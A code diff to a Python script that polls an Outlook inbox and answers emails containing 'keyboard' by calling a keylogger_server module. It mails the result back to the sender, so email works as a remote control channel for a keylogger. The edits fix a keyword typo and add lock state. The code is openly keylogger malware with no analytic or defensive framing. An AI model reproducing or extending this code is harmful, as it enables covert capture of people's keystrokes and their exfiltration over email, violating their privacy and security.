@@ -4,7 +4,7 @@ import keylogger_server
 import win32com.client
 
 outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
-
+islock = 0
 def sendBack(subject,body,sendTo):
     repMailItem = win32com.client.Dispatch("Outlook.Application").CreateItem(0)
     repMailItem.Subject = subject
@@ -16,10 +16,11 @@ def sendBack(subject,body,sendTo):
     repMailItem.Send()
 
 def listen(msg):
+    global islock
     string = msg.lower()
     rep = ""
-    if "keybroad" in string:
-        rep = rep + keylogger_server.keylog(string) + "\n"
+    if "keyboard" in string:
+        rep,islock = keylogger_server.keylog(msg,islock)
 
     return rep
 
@@ -31,6 +32,7 @@ while True:
     mailNow = messages.GetLast()
     if( mailNow.ReceivedTime > mailDefault.ReceivedTime ):
         rep = listen(mailNow.Body)
+        print(rep)
         sendBack("I'm bot",rep,mailNow.Sender.GetExchangeUser().PrimarySmtpAddress)
         mailDefault = mailNow
         print(True)
